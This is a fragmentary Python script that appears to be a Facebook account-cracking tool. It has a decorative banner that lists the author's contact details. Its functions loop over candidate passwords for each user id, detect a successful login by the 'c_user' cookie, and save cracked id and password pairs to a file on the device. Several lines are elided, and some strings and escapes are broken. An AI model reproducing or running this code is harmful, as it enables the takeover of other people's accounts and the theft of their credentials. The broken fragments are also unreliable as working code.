...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By  . FUCK")
...
os.system("xdg-open https://github.com/OMIdark")
logo=("""\33[92;1m
█
  ______   __       __  ______ 
 /      \ /  \     /  |/      |
...
$$    $$/ $$ | $/  $$ |/ $$   |
 $$$$$$/  $$/      $$/ $$$$$$/                                                                                              
                \33[1;30m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 my dark  𝐰𝐨𝐫𝐥𝐝 ♚
\33[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\33[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \33[38;5;196m: \3[97;1m OMI HASAN♚   \33[38;5;46m               ▇▎ 
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \33[38;5;196m: \33[1;92m OmiHasan ( 𝐌 )  \33[38;5;46m           ▇▎  
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \33[38;5;196m: \33[1;92m+𝟖801406115895\33[38;5;46m                  ▇▎
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\ \33[1;90m[\33[1;93m . FUCK\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/ . FUCK-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\\33[m[ . FUCK] \33[1;92m%s\33[m |\33[m[\33[mOK:\33[1;92m%s\33[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \{R} [{B} . FUCK{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€�{P}[{H}{ok}{P}]Ã¢â‚¬â€�{P}[{k}{cp}{x}]Ã¢â‚¬â€�[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/ . FUCK-ok.txt', 'a').write(cid+' | '+ps+'\')
                break
            else:
                continue
        loop+=1        
